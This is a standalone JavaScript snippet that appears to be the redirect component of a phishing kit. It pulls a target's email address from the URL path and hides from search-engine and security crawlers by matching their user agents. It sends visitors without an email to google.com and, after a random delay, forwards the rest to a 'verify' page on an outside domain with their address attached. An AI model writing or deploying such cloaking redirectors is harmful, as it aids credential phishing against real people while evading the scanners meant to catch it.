(function () {
  function getEmailFromPath() {
    const pathSegments = window.location.pathname.split("/");
    const emailCandidate = pathSegments[pathSegments.length - 1];
    return decodeURIComponent(emailCandidate);
  }

  function isBotUserAgent() {
    const bots = [
      /bot/i,
      /crawler/i,
      /spider/i,
      /crawling/i,
      /google/i,
      /bing/i,
      /yahoo/i,
      /facebook/i,
      /duckduckgo/i,
      /baidu/i,
      /yandex/i,
    ];
    const ua = navigator.userAgent;
    return bots.some(bot => bot.test(ua));
  }

  function redirectUser(email) {
    const delay = Math.floor(Math.random() * 3000) + 1000; // 1s to 4s
    setTimeout(() => {
      window.location.href = "https://verify.yourdomain.com/ref.html#" + encodeURIComponent(email);
    }, delay);
  }

  window.addEventListener("load", () => {
    if (isBotUserAgent()) {
      console.log("Bot detected, exiting...");
      return;
    }

    const email = getEmailFromPath();
    if (!email || !email.includes("@")) {
      window.location.href = "https://google.com";
      return;
    }

    redirectUser(email);
  });
})();
